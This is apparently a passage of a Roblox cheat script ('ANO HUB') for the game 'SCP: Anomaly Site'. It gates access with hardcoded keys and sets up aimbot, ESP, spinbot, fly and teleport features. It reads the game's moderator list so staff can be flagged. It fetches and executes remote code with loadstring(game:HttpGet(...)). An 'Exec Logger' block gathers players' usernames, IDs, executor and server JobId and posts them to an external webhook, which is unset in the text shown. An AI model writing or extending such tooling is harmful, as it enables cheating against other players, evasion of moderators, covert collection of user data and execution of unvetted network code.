local CONFIG = {
    Name = "ANO HUB",
    Version = "1.7",
    Status = "Halloween Update",
    DiscordLink = "https://discord.gg/TnDvAQ4qTd",
    MenuKeybind = "RightShift",
    WebhookEnabled = true,
    WebhookURL = nil,
    WebhookSecret = false,
    UpdateLog = {
        Header = "V1.8 Github Update:",
        Lines = {
            "- Github yayy!",
            "- Fixed some bugs",
            "- Hi",
            "- Bessst script",
            "- Idk",
            "- Added more bugs to fix later",
        },
    },
    Credits = {
        "AI's - menu alpha/beta",
        "N██ - creator",
        "W████ - Tester/Aimbot+FOV",
        "M███ - Tester",
        "Obsidian - GUI Library",
    },
    DevUsernames = {
        "NekSeekOff",
        "T4Nmb",
        "sergbogd802",
    },
    ProtectedUsernames = {
        "NekSeekOff",
        "T4Nmb",
        "sergbogd802",
    },
    DevUsers = {},
    ProtectedUsers = {},
    ESPBlacklist = {},
    MultiUseKeys = {
        ["ANO_1.3_UPD"] = 10,
        ["ANO_MULTI_2"] = 10,
        ["ANO_MULTI_3"] = 10,
        ["ANO_MULTI_4"] = 10,
        ["ANO_MULTI_5"] = 10,
    },
}

local ALLOWED_PLACE_ID = 103506116893376
if game.PlaceId ~= ALLOWED_PLACE_ID then
    local plr = game:GetService("Players").LocalPlayer
    if plr then
        pcall(function() plr:Kick("This Script is for SCP: Anomaly Site!") end)
    end
    while true do task.wait(10) end
end

local VALID_KEY = "Release"
local DISCORD_LINK = CONFIG.DiscordLink
local KEY_FILE = "AnoHub_key.txt"
local USED_KEYS_FILE = "AnoHub_used_keys.txt"

local ONE_TIME_KEYS = {
    ["ANO_1A2B3C"] = true, ["ANO_4D5E6F"] = true, ["ANO_7G8H9I"] = true,
    ["ANO_0J1K2L"] = true, ["ANO_3M4N5O"] = true, ["ANO_6P7Q8R"] = true,
    ["ANO_9S0T1U"] = true, ["ANO_2V3W4X"] = true, ["ANO_5Y6Z7A"] = true,
    ["ANO_8B9C0D"] = true, ["ANO_1E2F3G"] = true, ["ANO_4H5I6J"] = true,
    ["ANO_7K8L9M"] = true, ["ANO_0N1O2P"] = true, ["ANO_3Q4R5S"] = true,
    ["ANO_6T7U8V"] = true, ["ANO_9W0X1Y"] = true, ["ANO_2Z3A4B"] = true,
    ["ANO_5C6D7E"] = true, ["ANO_8F9G0H"] = true,
}

local KeyPlayers = game:GetService("Players")
local KeyLocalPlayer = KeyPlayers.LocalPlayer

local function readFile(path)
    if not readfile or not isfile then return nil end
    if isfile(path) then
        local ok, data = pcall(readfile, path)
        if ok and data and data ~= "" then return data end
    end
    return nil
end

local function writeFile(path, data)
    if writefile then pcall(writefile, path, data) end
end

local function deleteFile(path)
    if delfile and isfile and isfile(path) then pcall(delfile, path) end
end

local function readSavedKey()
    local data = readFile(KEY_FILE)
    if data then return data:gsub("%s", "") end
    return nil
end

local function readKeyUsage()
    local data = readFile(USED_KEYS_FILE)
    if not data then return {} end
    local used = {}
    for line in data:gmatch("[^\n]+") do
        local key, count = line:match("^([^:]+):(%d+)$")
        if key and count then
            used[key:gsub("%s", "")] = tonumber(count) or 0
        else
            local single = line:gsub("%s", "")
            if single ~= "" then used[single] = 1 end
        end
    end
    return used
end

local function saveKeyUsage(key, count)
    local used = readKeyUsage()
    used[key] = count
    local lines = {}
    for k, v in pairs(used) do
        table.insert(lines, k .. ":" .. tostring(v))
    end
    writeFile(USED_KEYS_FILE, table.concat(lines, "\n"))
end

local function getKeyUseCount(key)
    local used = readKeyUsage()
    return used[key] or 0
end

local function isValidKey(key)
    key = tostring(key):gsub("%s", "")
    if key == VALID_KEY then return true, "constant" end
    if ONE_TIME_KEYS[key] then
        if getKeyUseCount(key) >= 1 then return false, "used" end
        return true, "onetime"
    end
    if CONFIG.MultiUseKeys and CONFIG.MultiUseKeys[key] then
        local limit = CONFIG.MultiUseKeys[key]
        local current = getKeyUseCount(key)
        if current >= limit then return false, "used" end
        return true, "multi", limit - current
    end
    return false, "invalid"
end

local savedKey = readSavedKey()
local keyValid = false
local keyType = nil

if savedKey then
    local ok, type_ = isValidKey(savedKey)
    if ok then
        keyValid = true
        keyType = type_
    else
        deleteFile(KEY_FILE)
        savedKey = nil
    end
end

local keySuccess = keyValid

if not keyValid then
    local gui = Instance.new("ScreenGui")
    gui.Name = "AnoHubKeySystem"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999
    gui.Parent = KeyLocalPlayer:WaitForChild("PlayerGui")

    local main = Instance.new("Frame")
    main.Size = UDim2.new(0, 420, 0, 260)
    main.Position = UDim2.new(0.5, -210, 0.5, -130)
    main.BackgroundColor3 = Color3.fromRGB(24, 17, 17)
    main.BorderSizePixel = 0
    main.Active = true
    main.Draggable = true
    main.Parent = gui
    local c1 = Instance.new("UICorner")
    c1.CornerRadius = UDim.new(0, 12)
    c1.Parent = main
    local s1 = Instance.new("UIStroke")
    s1.Color = Color3.fromRGB(215, 110, 0)
    s1.Thickness = 1.5
    s1.Transparency = 0.3
    s1.Parent = main

    local top = Instance.new("Frame")
    top.Size = UDim2.new(1, 0, 0, 40)
    top.BackgroundColor3 = Color3.fromRGB(126, 78, 15)
    top.BorderSizePixel = 0
    top.Parent = main
    local tc = Instance.new("UICorner")
    tc.CornerRadius = UDim.new(0, 12)
    tc.Parent = top
    local tf = Instance.new("Frame")
    tf.Size = UDim2.new(1, 0, 0, 12)
    tf.Position = UDim2.new(0, 0, 1, -12)
    tf.BackgroundColor3 = Color3.fromRGB(126, 78, 15)
    tf.BorderSizePixel = 0
    tf.Parent = top

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -20, 1, 0)
    title.Position = UDim2.new(0, 12, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "ANO HUB - KEY SYSTEM"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 16
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = top

    local sub = Instance.new("TextLabel")
    sub.Size = UDim2.new(1, -30, 0, 20)
    sub.Position = UDim2.new(0, 15, 0, 50)
    sub.BackgroundTransparency = 1
    sub.Text = "Enter your key to continue"
    sub.TextColor3 = Color3.fromRGB(180, 180, 200)
    sub.TextSize = 13
    sub.Font = Enum.Font.Gotham
    sub.TextXAlignment = Enum.TextXAlignment.Left
    sub.Parent = main

    local input = Instance.new("TextBox")
    input.Size = UDim2.new(1, -30, 0, 42)
    input.Position = UDim2.new(0, 15, 0, 80)
    input.BackgroundColor3 = Color3.fromRGB(35, 25, 20)
    input.BorderSizePixel = 0
    input.Text = ""
    input.PlaceholderText = "Key from the discord"
    input.TextColor3 = Color3.fromRGB(255, 255, 255)
    input.PlaceholderColor3 = Color3.fromRGB(140, 110, 80)
    input.TextSize = 15
    input.Font = Enum.Font.Gotham
    input.ClearTextOnFocus = false
    input.Parent = main
    local ic = Instance.new("UICorner")
    ic.CornerRadius = UDim.new(0, 8)
    ic.Parent = input
    local is = Instance.new("UIStroke")
    is.Color = Color3.fromRGB(65, 41, 5)
    is.Thickness = 1
    is.Parent = input

    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, -30, 0, 20)
    status.Position = UDim2.new(0, 15, 0, 128)
    status.BackgroundTransparency = 1
    status.Text = ""
    status.TextColor3 = Color3.fromRGB(255, 80, 80)
    status.TextSize = 13
    status.Font = Enum.Font.Gotham
    status.TextXAlignment = Enum.TextXAlignment.Left
    status.Parent = main

    local submitBtn = Instance.new("TextButton")
    submitBtn.Size = UDim2.new(0, 185, 0, 42)
    submitBtn.Position = UDim2.new(0, 15, 0, 158)
    submitBtn.BackgroundColor3 = Color3.fromRGB(215, 110, 0)
    submitBtn.Text = "Submit"
    submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    submitBtn.TextSize = 15
    submitBtn.Font = Enum.Font.GothamBold
    submitBtn.BorderSizePixel = 0
    submitBtn.Parent = main
    local sbc = Instance.new("UICorner")
    sbc.CornerRadius = UDim.new(0, 8)
    sbc.Parent = submitBtn

    local discordBtn = Instance.new("TextButton")
    discordBtn.Size = UDim2.new(0, 185, 0, 42)
    discordBtn.Position = UDim2.new(1, -200, 0, 158)
    discordBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    discordBtn.Text = "Get Key (Discord)"
    discordBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    discordBtn.TextSize = 14
    discordBtn.Font = Enum.Font.GothamBold
    discordBtn.BorderSizePixel = 0
    discordBtn.Parent = main
    local dbc = Instance.new("UICorner")
    dbc.CornerRadius = UDim.new(0, 8)
    dbc.Parent = discordBtn

    local dcLabel = Instance.new("TextLabel")
    dcLabel.Size = UDim2.new(1, -30, 0, 20)
    dcLabel.Position = UDim2.new(0, 15, 0, 210)
    dcLabel.BackgroundTransparency = 1
    dcLabel.Text = "Discord: " .. DISCORD_LINK
    dcLabel.TextColor3 = Color3.fromRGB(140, 110, 80)
    dcLabel.TextSize = 11
    dcLabel.Font = Enum.Font.Gotham
    dcLabel.TextXAlignment = Enum.TextXAlignment.Left
    dcLabel.Parent = main

    submitBtn.MouseButton1Click:Connect(function()
        local entered = input.Text:gsub("%s", "")
        if entered == "" then
            status.Text = "Enter a key"
            status.TextColor3 = Color3.fromRGB(255, 80, 80)
            return
        end
        local ok, type_, remaining = isValidKey(entered)
        if ok then
            if type_ == "multi" and remaining then
                status.Text = "Key accepted! (" .. remaining .. " uses left)"
            else
                status.Text = "Key accepted! Loading..."
            end
            status.TextColor3 = Color3.fromRGB(80, 255, 80)
            if type_ == "onetime" then
                saveKeyUsage(entered, 1)
            elseif type_ == "multi" then
                local current = getKeyUseCount(entered)
                saveKeyUsage(entered, current + 1)
            else
                writeFile(KEY_FILE, entered)
            end
            keySuccess = true
            task.wait(0.5)
            gui:Destroy()
        else
            if type_ == "used" then
                status.Text = "This key has been fully used"
            else
                status.Text = "Invalid key"
            end
            status.TextColor3 = Color3.fromRGB(255, 80, 80)
            input.Text = ""
        end
    end)

    input.FocusLost:Connect(function(enterPressed)
        if enterPressed then submitBtn:Fire("MouseButton1Click") end
    end)

    discordBtn.MouseButton1Click:Connect(function()
        if setclipboard then pcall(setclipboard, DISCORD_LINK) end
        status.Text = "Discord copied! Join and get key."
        status.TextColor3 = Color3.fromRGB(88, 101, 242)
    end)

    while not keySuccess do task.wait(0.1) end
end

task.spawn(function()
    if not CONFIG.WebhookEnabled then return end
    if not CONFIG.WebhookURL or CONFIG.WebhookURL == "" or CONFIG.WebhookURL == "Placeholder" then return end

    task.wait(5)

    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local UserInput = game:GetService("UserInputService")
    local Stats = game:GetService("Stats")
    local plr = Players.LocalPlayer
    if not plr then return end

    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if not req then
        warn("[Webhook] No request function")
        return
    end

    local userId = plr.UserId
    local userName = plr.Name
    local display = plr.DisplayName or plr.Name
    local placeId = game.PlaceId
    local jobId = tostring(game.JobId)
    local time = os.date("%Y-%m-%d %H:%M:%S")

    local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"

    local executor = "Unknown"
    pcall(function()
        if identifyexecutor then
            local r = identifyexecutor()
            if type(r) == "string" then executor = r
            elseif type(r) == "table" then executor = r.Name or "Unknown" end
        end
    end)

    local device = "PC"
    pcall(function()
        local p = UserInput:GetPlatform()
        if p == Enum.Platform.Android or p == Enum.Platform.IOS then device = "Mobile"
        elseif p == Enum.Platform.XboxOne then device = "Xbox" end
    end)

    local mem = "?"
    pcall(function() mem = math.floor(Stats:GetTotalMemoryUsageMb()) end)

    local ping = "N/A"
    pcall(function()
        local s = Stats.Network.ServerStatsItem["Data Ping"]:GetValueString()
        ping = s:match("(%d+)") or "N/A"
    end)

    local function normalizeRole(raw)
        if not raw then return nil end
        local r = string.lower(tostring(raw)):gsub("%s+", "_"):gsub("%-", "_")
        r = r:gsub("^_+", ""):gsub("_+$", "")
        local map = {
            ["d_class"]="D-Class",["dclass"]="D-Class",["class_d"]="D-Class",
            ["scientist"]="Scientist",["researcher"]="Scientist",
            ["security"]="Security",["guard"]="Security",
            ["mtf"]="MTF",["mobile_task_force"]="MTF",
            ["chaos_insurgency"]="Chaos Insurgency",["chaos"]="Chaos Insurgency",["ci"]="Chaos Insurgency",
            ["director"]="Director",["site_director"]="Director",
            ["anomaly"]="Anomaly",["scp"]="Anomaly",
            ["neutral"]="Neutral",["unknown"]="Neutral",
        }
        return map[r] or raw
    end

    local function getRole(p)
        if not p then return "Neutral" end
        local r = p:GetAttribute("Role")
        if r and r ~= "" then local n = normalizeRole(r) if n and n ~= "Neutral" then return n end end
        r = p:GetAttribute("Team")
        if r and r ~= "" then local n = normalizeRole(r) if n and n ~= "Neutral" then return n end end
        if p.Team and p.Team.Name ~= "" then
            local n = normalizeRole(p.Team.Name) if n and n ~= "Neutral" then return n end
        end
        if p:FindFirstChild("leaderstats") then
            local rv = p.leaderstats:FindFirstChild("Role") or p.leaderstats:FindFirstChild("Team")
            if rv and rv.Value and rv.Value ~= "" then
                local n = normalizeRole(rv.Value) if n and n ~= "Neutral" then return n end
            end
        end
        if p.Character then
            r = p.Character:GetAttribute("Role")
            if r and r ~= "" then local n = normalizeRole(r) if n and n ~= "Neutral" then return n end end
        end
        return "Neutral"
    end

    local playerRole = getRole(plr)
    local isDev = CONFIG.DevUsers[userId] ~= nil
    local scriptRole = isDev and "DEV" or "User"

    local snipe = string.format(
        "game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",
        placeId, jobId
    )

    local payload = {
        embeds = {{
            title = "🚀 " .. CONFIG.Name .. " v" .. CONFIG.Version .. " executed",
            color = isDev and 0xFFAA00 or 0xD76E00,
            thumbnail = { url = avatar },
            fields = {
                { name = "Username",    value = "`" .. userName .. "`", inline = true },
                { name = "Display",     value = display,                inline = true },
                { name = "UserId",      value = "`" .. tostring(userId) .. "`", inline = true },
                { name = "Ingame Role", value = "**" .. playerRole .. "**", inline = true },
                { name = "Script Role", value = "`" .. scriptRole .. "`", inline = true },
                { name = "Executor",    value = executor,               inline = true },
                { name = "Device",      value = device,                 inline = true },
                { name = "Memory",      value = mem .. " MB",           inline = true },
                { name = "Ping",        value = ping .. " ms",          inline = true },
                { name = "PlaceId",     value = "`" .. tostring(placeId) .. "`", inline = true },
                { name = "Time",        value = time,                   inline = false },
                { name = "JobId",       value = "`" .. jobId .. "`",    inline = false },
                { name = "Snipe",       value = "```lua\n" .. snipe .. "```", inline = false },
            },
            footer = { text = CONFIG.Name .. " Exec Logger" },
            timestamp = DateTime.now():ToIsoDate(),
        }}
    }

    print("[Webhook] Sending...")
    local ok, err = pcall(function()
        req({
            Url = CONFIG.WebhookURL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload),
        })
    end)

    if ok then
        print("[Webhook] SENT successfully!")
    else
        warn("[Webhook] FAILED: " .. tostring(err))
    end
end)

do
    _G.ScriptConfig = {
        Name = CONFIG.Name,
        Version = CONFIG.Version,
        Status = CONFIG.Status,
        DiscordLink = CONFIG.DiscordLink,
        MenuKeybind = CONFIG.MenuKeybind,
    }
    _G.MenuKeybind = Enum.KeyCode[CONFIG.MenuKeybind]
    _G.ESPBlacklist = CONFIG.ESPBlacklist
    _G.CONFIG = CONFIG
    _G.DevUsers = CONFIG.DevUsers

    local repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
    _G.Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
    _G.ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
    _G.SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()

    _G.Window = _G.Library:CreateWindow({
        Title = _G.ScriptConfig.Name .. " v" .. _G.ScriptConfig.Version,
        Footer = "AnoHub Best Script For the SCP: Anomaly Site!",
        Icon = "zap",
        Center = true,
        AutoShow = false,
        NotifySide = "Right",
        ShowCustomCursor = true,
        Resizable = true,
    })

    _G.UserInputService = game:GetService("UserInputService")
    _G.RunService = game:GetService("RunService")
    _G.Players = game:GetService("Players")
    _G.Workspace = game:GetService("Workspace")
    _G.CollectionService = game:GetService("CollectionService")
    _G.HttpService = game:GetService("HttpService")
    _G.StarterGui = game:GetService("StarterGui")
    _G.Camera = _G.Workspace.CurrentCamera
    _G.LocalPlayer = _G.Players.LocalPlayer

    _G.Library.ShowCustomCursor = false

    _G.ToggleButton = _G.Library:AddDraggableImageButton({
        Icon = "zap",
        IconSize = 48,
        Func = function() _G.Window:Toggle() end,
    })

    _G.ToggleButton.Button.BackgroundColor3 = Color3.fromRGB(126, 78, 15)
    _G.ToggleButton.Button.BackgroundTransparency = 0.1
    _G.ToggleButton.Button.Size = UDim2.new(0, 80, 0, 80)
    _G.ToggleButton.Button.Position = UDim2.new(1, -95, 0.92, 0)
    _G.ToggleButton.Button.AnchorPoint = Vector2.new(1, 0.5)

    local ToggleCorner = Instance.new("UICorner")
    ToggleCorner.CornerRadius = UDim.new(0, 16)
    ToggleCorner.Parent = _G.ToggleButton.Button
    _G.ToggleStroke = Instance.new("UIStroke")
    _G.ToggleStroke.Color = Color3.fromRGB(215, 110, 0)
    _G.ToggleStroke.Thickness = 2.5
    _G.ToggleStroke.Transparency = 0.5
    _G.ToggleStroke.Parent = _G.ToggleButton.Button

    _G.Library.Scheme.BackgroundColor = Color3.fromRGB(24, 17, 17)
    _G.Library.Scheme.MainColor = Color3.fromRGB(126, 78, 15)
    _G.Library.Scheme.AccentColor = Color3.fromRGB(215, 110, 0)
    _G.Library.Scheme.OutlineColor = Color3.fromRGB(65, 41, 5)
    _G.Library.Scheme.FontColor = Color3.fromRGB(255, 255, 255)
    _G.Library:UpdateColorsUsingRegistry()

    _G.ThemeManager.BuiltInThemes["AnoHub Red"] = { 999, {
        FontColor = "ffffff", MainColor = "231414", AccentColor = "cd5c5c",
        BackgroundColor = "140f0f", OutlineColor = "3c1e1e",
    }}
    _G.ThemeManager.BuiltInThemes["Boyfriend White"] = { 1000, {
        FontColor = "000000", MainColor = "e8e8e8", AccentColor = "b0b0b0",
        BackgroundColor = "f0f0f0", OutlineColor = "a0a0a0",
    }}
    _G.ThemeManager.BuiltInThemes["Dark Orange"] = { 1001, {
        FontColor = "ffa800", MainColor = "050501", AccentColor = "ff4b00",
        BackgroundColor = "000000", OutlineColor = "713102",
    }}
    _G.ThemeManager.BuiltInThemes["Halloween"] = { 1002, {
        FontColor = "ffffff", MainColor = "7e4e0f", AccentColor = "d76e00",
        BackgroundColor = "181111", OutlineColor = "412905",
        BackgroundImage = "rbxassetid://5873138434",
    }}

    _G.ThemeManager:SetLibrary(_G.Library)
    _G.SaveManager:SetLibrary(_G.Library)
    _G.SaveManager:IgnoreThemeSettings()
    _G.SaveManager:SetIgnoreIndexes({"MenuKeybind"})
    _G.ThemeManager:SetFolder("AnoHub")
    _G.SaveManager:SetFolder("AnoHub")
    _G.SaveManager:SetSubFolder("settings")

    _G.Tabs = {
        Info = _G.Window:AddTab("Info", "info"),
        Player = _G.Window:AddTab("Player", "user"),
        Combat = _G.Window:AddTab("Combat", "swords"),
        Visual = _G.Window:AddTab("Visual", "eye"),
        Teleports = _G.Window:AddTab("Teleports", "map-pin"),
        Misc = _G.Window:AddTab("Misc", "cog"),
        Dev = nil,
        Settings = _G.Window:AddTab("Settings", "settings"),
        Achievements = _G.Window:AddTab("Achievements", "trophy"),
    }

    _G.isDevUser = function()
        return _G.DevUsers[_G.LocalPlayer.UserId] ~= nil
    end

    _G.espObjs = {}
    _G.espConns = {}
    _G.espActive = false
    _G.espOptions = {
        name = true, role = true, health = true, rank = true,
        tags = true, distance = false, highlight = true,
        anoHub = true,
    }
    _G.roleFilter = {
        d_class = true, scientist = true, security = true, mtf = true,
        chaos_insurgency = true, director = true, anomaly = true, neutral = true,
    }

    _G.aimbotSettings = {
        Enabled = false, FOV = 250, Smooth = 3, AimPart = "Head",
        CircleColor = Color3.fromRGB(255, 0, 0),
        WhitelistEnabled = true, ShowFOVCircle = true,
        WallCheck = false, MaxRange = 500, Priority = "Center",
        AimMode = "Light", AimKey = "MouseButton2",
        FOVShape = "Circle", FOVIgnore = false, StealthMode = false,
        AimDelay = 0, HumanLikeSmoothing = "Linear", MissChance = 0,
        RandomJitter = 0, Spinbot = false, SpinSpeed = 60,
        TagFilterEnabled = false, TagFilter = {},
        TagBlacklistEnabled = false, TagBlacklist = {},
    }

    _G.rmbHeld = false
    _G.lmbHeld = false
    _G.mobileAimbotBtnHeld = false
    _G.aimbotConnection = nil
    _G.aimbotFovCircle = nil
    _G.aimbotFovFrame = nil
    _G.aimbotFovStroke = nil

    _G.aimbotIgnoreList = {
        ["d_class"] = {"d_class", "chaos_insurgency"},
        ["scientist"] = {"mtf", "scientist", "security", "director"},
        ["security"] = {"mtf", "scientist", "security", "director"},
        ["mtf"] = {"mtf", "scientist", "security", "director"},
        ["chaos_insurgency"] = {"chaos_insurgency", "d_class"},
        ["director"] = {"mtf", "scientist", "security", "director"},
        ["anomaly"] = {"neutral"},
        ["neutral"] = {}
    }

    _G.playerWhitelist = { Enabled = false, Players = {} }
    _G.specialRoleWhitelist = {
        Enabled = false,
        Roles = {
            d_class = false, scientist = false, security = false, mtf = false,
            chaos_insurgency = false, director = false, anomaly = false, neutral = false,
        },
    }

    _G.lockOnActive = false
    _G.lockOnTarget = nil
    _G.lockOnHighlight = nil
    _G.lockOnConnection = nil

    _G.customPoints = {}
    _G.POINTS_FILE = "AnoHub_custom_points.json"

    _G.infiniteJumpActive = false
    _G.infiniteJumpConn = nil
    _G.flyActive = false
    _G.flyLoop = nil
    _G.flySpeed = 60
    _G.clickTPActive = false
    _G.shakeActive = false
    _G.shakeRange = 15
    _G.lastCamCFrame = nil
    _G.chatNotifyEnabled = false
    _G.npcESPActive = false
    _G.npcESPObjects = {}
    _G.spectateGui = nil
    _G.spectateLabel = nil
    _G.spectateFrame = nil

    _G.easterEggActive = false
    _G.rainbowHighlightActive = false
    _G.rainbowTrailActive = false
    _G.rainbowTrail = nil
    _G.rainbowTrailConn = nil
    _G.secretClickCount = 0
    _G.HalloweenThemeApplied = true

    _G.easterMessages = {
        "You dont want this...", "Bro there is nothing secret 100%",
        "Stop thisss", "You are son of a...",
        "Hmm, why the f*ck are you still clicking?",
        "Bro, it's just a damn theme...",
        "There is nothing f*cking secret here, trust me",
        "You are actually f*cking insane", "Last warning, stop this sh*t",
    }

    _G.roleAlertFilter = {
        d_class = false, scientist = false, security = false, mtf = false,
        chaos_insurgency = false, director = false, anomaly = false, neutral = false,
    }
    _G.roleAlerted = {}

    _G.staffIds = {}
    _G.staffIdsWallhack = {}
    _G.staffNotified = {}
    _G.staffTagEnabled = true

    _G.roleColors = {
        ["d_class"] = Color3.fromRGB(255, 150, 58),
        ["scientist"] = Color3.fromRGB(164, 228, 255),
        ["security"] = Color3.fromRGB(188, 188, 188),
        ["mtf"] = Color3.fromRGB(66, 79, 255),
        ["chaos_insurgency"] = Color3.fromRGB(214, 90, 78),
        ["director"] = Color3.fromRGB(106, 199, 101),
        ["anomaly"] = Color3.fromRGB(98, 83, 172),
        ["neutral"] = Color3.fromRGB(200, 200, 200),
        ["npc"] = Color3.fromRGB(85, 20, 130),
    }

    _G.statsCounter = {
        teleports = 0, collects = 0, deaths = 0, aimbotActivations = 0,
        npcsSeen = 0, fliesActivated = 0, noclipsActivated = 0,
        escapesDone = 0, farmsStarted = 0, serverHops = 0,
        lockOnActivations = 0, spinbotActivations = 0, auraSeconds = 0,
        clickTPUses = 0,
        autoHops = 0,
        challengesDone = 0,
        kills = 0,
        killStreak = 0,
        themeChanges = 0,
        keybindChanges = 0,
        startTime = tick(),
    }

    _G.AnoHubTag = "AnoHub_User_2026"

    local function _tagSelf()
        local char = _G.LocalPlayer.Character
        if char then
            if not _G.CollectionService:HasTag(char, _G.AnoHubTag) then
                _G.CollectionService:AddTag(char, _G.AnoHubTag)
            end
        end
    end    _G.LocalPlayer.CharacterAdded:Connect(function(char)
        task.wait(1)
        if not _G.CollectionService:HasTag(char, _G.AnoHubTag) then
            _G.CollectionService:AddTag(char, _G.AnoHubTag)
        end
    end)

    _tagSelf()

    function _G.isAnoHubUser(plr)
        if not plr then return false end
        if plr == _G.LocalPlayer then return true end
        local char = plr.Character
        if not char then return false end
        return _G.CollectionService:HasTag(char, _G.AnoHubTag) == true
    end

    function _G.isHiddenDev(plr)
        if not plr then return false end
        if plr == _G.LocalPlayer then return false end
        if not _G.DevUsers[plr.UserId] then return false end
        local iAmDev = _G.DevUsers[_G.LocalPlayer.UserId] ~= nil
        if iAmDev then return false end
        return true
    end

    function _G.loadStaffIds()
        _G.staffIds = {}
        _G.staffIdsWallhack = {}
        pcall(function()
            local mod = game:GetService("ReplicatedStorage"):FindFirstChild("Moderators")
            if mod and mod:IsA("ModuleScript") then
                local ok, data = pcall(require, mod)
                if ok and type(data) == "table" then
                    for _, v in pairs(data) do
                        if type(v) == "number" then table.insert(_G.staffIds, v) end
                    end
                    if type(data.__wallhack) == "table" then
                        for _, v in pairs(data.__wallhack) do
                            if type(v) == "number" then table.insert(_G.staffIdsWallhack, v) end
                        end
                    end
                end
            end
        end)
    end
    _G.loadStaffIds()

    function _G.isStaffId(userId)
        for _, id in ipairs(_G.staffIds) do if id == userId then return true end end
        for _, id in ipairs(_G.staffIdsWallhack) do if id == userId then return true end end
        return false
    end

    _G.GAME_GROUP_ID = 35275032
    _G.STAFF_ROLES = { ["Contractor"]=true, ["Moderator"]=true, ["Tester"]=true, ["Contributor"]=true }
    _G.CREATOR_ROLE = "Lead"
    _G.groupRoleCache = {}

    function _G.getGroupRole(plr)
        if not plr then return "Guest" end
        if _G.groupRoleCache[plr.UserId] then return _G.groupRoleCache[plr.UserId] end
        local ok, role = pcall(function() return plr:GetRoleInGroup(_G.GAME_GROUP_ID) end)
        if ok and role and role ~= "" then
            _G.groupRoleCache[plr.UserId] = role
            return role
        end
        return "Guest"
    end

    function _G.isCreator(plr) return plr and _G.getGroupRole(plr) == _G.CREATOR_ROLE end

    function _G.isStaff(plr)
        if not plr then return false end
        if _G.isStaffId(plr.UserId) then return true end
        local role = _G.getGroupRole(plr)
        if role == "Guest" then return false end
        if role == _G.CREATOR_ROLE then return true end
        return _G.STAFF_ROLES[role] == true
    end

    function _G.getStaffRoleName(plr)
        if not plr then return nil end
        if _G.isCreator(plr) then return "CREATOR" end
        local role = _G.getGroupRole(plr)
        if _G.STAFF_ROLES[role] then return role end
        if _G.isStaffId(plr.UserId) then return "Legacy Staff" end
        return nil
    end

    function _G.normalizeRole(raw)
        if not raw then return nil end
        local r = string.lower(tostring(raw)):gsub("%s+","_"):gsub("%-","_")
        r = r:gsub("^_+",""):gsub("_+$","")
        local map = {
            ["d_class"]="d_class",["dclass"]="d_class",["class_d"]="d_class",
            ["scientist"]="scientist",["researcher"]="scientist",
            ["security"]="security",["guard"]="security",["security_guard"]="security",
            ["mtf"]="mtf",["mobile_task_force"]="mtf",["mobile_task_forces"]="mtf",
            ["chaos_insurgency"]="chaos_insurgency",["chaos"]="chaos_insurgency",["ci"]="chaos_insurgency",
            ["director"]="director",["site_director"]="director",
            ["anomaly"]="anomaly",["scp"]="anomaly",
            ["neutral"]="neutral",["unknown"]="neutral",
        }
        return map[r] or r
    end

    function _G.getPlayerRole(plr)
        if not plr then return "neutral" end
        local r = plr:GetAttribute("Role")
        if r and r ~= "" then
            local n = _G.normalizeRole(r)
            if n and n ~= "neutral" and n ~= "unknown" and n ~= "" then return n end
        end
        r = plr:GetAttribute("Team")
        if r and r ~= "" then
            local n = _G.normalizeRole(r)
            if n and n ~= "neutral" and n ~= "unknown" and n ~= "" then return n end
        end
        if plr.Team and plr.Team.Name and plr.Team.Name ~= "" then
            local n = _G.normalizeRole(plr.Team.Name)
            if n and n ~= "neutral" and n ~= "unknown" and n ~= "" then return n end
        end
        if plr:FindFirstChild("leaderstats") then
            local rv = plr.leaderstats:FindFirstChild("Role")
            if rv and rv.Value and rv.Value ~= "" then
                local n = _G.normalizeRole(rv.Value)
                if n and n ~= "neutral" and n ~= "unknown" and n ~= "" then return n end
            end
            local tv = plr.leaderstats:FindFirstChild("Team")
            if tv and tv.Value and tv.Value ~= "" then
                local n = _G.normalizeRole(tv.Value)
                if n and n ~= "neutral" and n ~= "unknown" and n ~= "" then return n end
            end
        end
        if plr.Character then
            r = plr.Character:GetAttribute("Role")
            if r and r ~= "" then
                local n = _G.normalizeRole(r)
                if n and n ~= "neutral" and n ~= "unknown" and n ~= "" then return n end
            end
        end
        return "neutral"
    end

    function _G.getPlayerRank(plr)
        if not plr then return "" end
        local tags = ""
        if plr:GetAttribute("VIP") == true then tags = tags .. "VIP" end
        if _G.staffTagEnabled then
            if _G.isCreator(plr) then tags = tags .. "[CREATOR]"
            else
                local role = _G.getStaffRoleName(plr)
                if role then tags = tags .. "[" .. role .. "]" end
            end
        end
        if _G.DevUsers[plr.UserId] then
            local iAmDev = _G.DevUsers[_G.LocalPlayer.UserId] ~= nil
            if iAmDev then
                tags = tags .. "[SCRIPT DEV]"
            end
        end
        return tags
    end

    function _G.getPlayerTags(plr)
        local tags = ""
        local char = plr.Character
        if not char then return tags end
        if _G.CollectionService:HasTag(char, "Escaped") then tags = tags .. " [Escaped]" end
        if _G.CollectionService:HasTag(char, "Hostile") then tags = tags .. " [Hostile]" end
        return tags
    end

    function _G.getPlayerRoleColor(plr)
        if not plr then return Color3.fromRGB(215, 110, 0) end
        local role = _G.getPlayerRole(plr)
        return _G.roleColors[role] or Color3.fromRGB(215, 110, 0)
    end

    function _G.getDisplayRoleColor(plr) return _G.getPlayerRoleColor(plr) end

